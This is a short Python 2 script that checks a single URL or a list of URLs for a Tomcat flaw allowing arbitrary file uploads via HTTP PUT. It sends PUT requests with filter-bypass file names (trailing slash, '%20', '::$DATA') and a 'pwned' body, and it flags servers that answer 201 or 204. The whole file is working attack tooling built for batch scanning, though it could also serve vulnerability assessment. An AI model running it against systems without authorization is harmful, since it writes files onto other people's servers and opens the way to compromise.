#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import os
import argparse

interest_status_code = [201, 204]
test_pattern = ["test.txt", "test.txt/", "test.txt%20", "test.txt::$DATA"]


def detect_tomcat_put(url):
    payload = {'whoami': 'nobody', 'pwned': 'yes'}
    for p in test_pattern:
        try:
            status = requests.put(url + p, payload, timeout=10, verify=False).status_code
            if status in interest_status_code:
                print "[+] status code {} has found with url {}".format(status, url)
                break
        except Exception, e:
            print "[-]connection error {}".format(url)


def read_from_file(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            url_list = []
            for line in f:
                line = ''.join(line.splitlines())
                if not line.startswith("http"):
                    line = "http://" + line
                if not line.endswith("/"):
                    line = line + "/"

                url_list.append(line)
        return url_list
    else:
        print "[!] file doesn't exist"


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='tomcat vulnerability that allows to put any file onto the server')
    parser.add_argument('-s', '--single', dest='target', help="test single url")
    parser.add_argument('-b', '--batch', dest='file', help='test a batch of url')

    options = parser.parse_args()
    if options.target and options.file:
        "please use only one option"
        exit(0)
    if options.target:
        detect_tomcat_put(options.target)
    elif options.file:
        try:
            l = read_from_file(options.file)
            for i in l:
                detect_tomcat_put(i)
        except Exception, e:
            print e
